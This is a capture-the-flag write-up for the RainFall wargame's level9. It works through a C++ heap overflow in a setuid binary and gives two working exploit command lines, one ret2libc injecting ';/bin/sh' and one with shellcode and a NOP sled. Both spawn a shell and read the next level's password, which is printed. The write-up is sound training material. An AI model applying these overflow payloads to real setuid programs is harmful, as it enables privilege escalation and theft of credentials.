level9
======

*	We spawn with a [level9](src/level9) executable
	```console
	level9@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
	level9@RainFall:~$ ./level9 
	level9@RainFall:~$ 
	```
*	Let's take a look at the [code](src/level9.cpp) I wrote since the ghidra version was horrible
	-	First thing I noticed was that it is in `C++`
	-	`main()`:
		-	check that there are more than 2 argc
		-	initialize two instance of the object of class `N` on the heap with `new`
		-	use `setAnnotation()` method on thy object with `argv[1]` as parameter
	-	the `N` class
		-	two variables : `value` and `annotation[100]`
		-	canonical form and `N::setAnnotation()` method which `memcpy()` the parameter to the array `annotation[100]`
*	We clearly have nothing concret like `/bin/sh` or `cat .pass`. However we should be able to overflow into a [Ret2libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc) kind of exploit or add our own shellcode to try and execute a `/bin/sh`.
*	We need :
	-	offset
	-	address of the start of the second buffer to store our exploit
	-	address of `system()` or `shellcode` depending on the exploit
*	The offset is easely found when looking at the code in gdb
	```gdb
	0x08048610 <+28>:    movl   $0x6c,(%esp)
	0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
	0x0804861c <+40>:    mov    %eax,%ebx
	[...]
	0x08048632 <+62>:    movl   $0x6c,(%esp)
	0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
	0x0804863e <+74>:    mov    %eax,%ebx
	```
	Those are the line corresponding to the initialization of our objects. Both of them need a `0x6c(HEX) -> 108(DEC)` sized buffer.
*	Now let's retrieve the address of the buffer
	```
	Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
	(gdb) disas main
		Dump of assembler code for function main:
		[...]
		0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
		0x0804867c <+136>:   mov    0x10(%esp),%eax
		[...]
		End of assembler dump.
	(gdb) b *main+136
		Breakpoint 1 at 0x804867c
	(gdb) run 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		Starting program: /home/user/level9/level9 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

		Breakpoint 1, 0x0804867c in main ()
		(gdb) i r $eax
		eax            0x804a00c        134520844
	```
	Here we needed to place a breakpoint after the allocation and retrieve the address stored in `$eax` which correspond to the start of the buffer -> `\x0c\xa0\x04\x08`
*	First let's try the `Ret2libc` option :
	*	Retrieve `system()`
		```gdb
		(gdb) p system
		$1 = {<text variable, no debug info>} 0xb7d86060 <system>
		```
		it gives us `\x60\x60\xd8\xb7`, we will also need to add `;/bin/sh`
	*	We have everything we need
		```console
		level9@RainFall:~$ ./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "A" * 104 + "\x0c\xa0\x04\x08" + ";/bin/sh")')
		[...]
		$ cat /home/user/bonus0/.pass
		f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
		```
*	Good now let's try the other one :
	*	Let's calculate the padding
		*	my older shellcode didn't work probably because of how the stack was dealing with the program so I used another one [here](src/shellcode.s) -> 27
		*	address of buffer = 4 bytes
		*	size of buffer = 108 bytes
		*	108 - 27 - 4 = `77 bytes` of padding
	*	And we get this :
		```console
		level9@RainFall:~$ ./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x90"*77 + shellcode + "\x0c\xa0\x04\x08")')
		$ whoami
		bonus0
		$ cat /home/user/bonus0/.pass
		f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
		```